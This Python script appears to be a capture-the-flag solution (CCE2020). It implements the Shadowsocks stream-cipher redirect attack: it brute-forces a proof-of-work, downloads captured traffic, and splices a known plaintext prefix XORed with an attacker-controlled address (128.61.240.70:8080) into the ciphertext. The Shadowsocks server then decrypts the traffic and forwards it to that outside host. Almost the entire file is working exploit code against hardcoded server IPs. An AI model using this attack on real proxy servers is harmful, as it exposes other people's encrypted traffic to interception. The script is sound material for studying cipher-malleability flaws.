from scapy.all import *
from pwn import *
from base64 import b64decode
from binascii import unhexlify
import itertools
import pickle
import socket
import time


hash_dict = None

def init_hash_dict():
    global hash_dict
    if hash_dict is not None:
        return

    if os.path.exists("pickle"):
        with open("pickle", "rb") as f:
            hash_dict = pickle.load(f)
    else:
        hash_dict = {}
        cnt = 0
        for s in itertools.product(string.ascii_letters + string.digits, repeat=4):
            s = ''.join(s).encode()
            result = hashlib.sha256(b"CCE2020_" + s).digest()
            hash_dict[result] = s
            cnt += 1
            if (cnt & 8191) == 0:
                print("Current: " + str(cnt))
            
        with open("pickle", "wb") as f:
            pickle.dump(hash_dict, f)


def read_packet():
    init_hash_dict()

    con = remote('13.124.52.90', 11111)

    leak = con.recvuntil('>>>')
    target = unhexlify(leak.strip().split(b') = ')[1].split()[0])
    con.sendline(hash_dict[target])

    con.recvuntil('and printed.')
    con.sendline('a')

    packet = b64decode(con.recvall().strip())
    con.close()

    return packet


def xor(s1, s2):
    n = len(s1)
    r = b''
    for i in range(n):
        r += bytes((s1[i] ^ s2[i],))
    return r


# https://www.vpsaff.net/wp-content/uploads/2020/02/Redirect-attack-on-Shadowsocks-stream-ciphers.pdf
# from: https://github.com/edwardz246003/shadowsocks/blob/master/attack2_with_https_pocket.py

serverip = "15.165.73.176"
serverport = 8388

# Address under out control
# 128.61.240.70 / 8080
targetIP = b'\x01' + p8(128) + p8(61) + p8(240) + p8(70) + b'\x1f\x90'

prefixes = [
    b'HTTP/1.', # HTTP Response
    b'GET / H', # HTTP Request
    b'POST / ', # HTTP Request
] + [
    b'\x16\x03\x03\x00' + bytes((b,)) + b'\x02\x00' for b in range(256) # TLS Server Hello
]

while True:
    pcap_raw = read_packet()
    with open("packet.pcap", "wb") as f:
        f.write(pcap_raw)

    pcap = rdpcap("packet.pcap")
    packets = []
    for session in pcap.sessions().values():
        c = b''
        for packet in session:
            if Raw in packet:
                c += packet[Raw].load

        if len(c) == 0:
            continue
        print(hexdump(c))
        packets.append(c)

    for (i, prefix) in enumerate(prefixes):
        print("Prefix " + str(i))
        for packet in packets:
            x = xor(prefix, targetIP)
            ciphertext = packet[0:16] + xor(x, packet[16:16+7]) + packet[16+7:]

            con = remote(serverip, serverport)
            con.send(ciphertext)
            con.interactive()
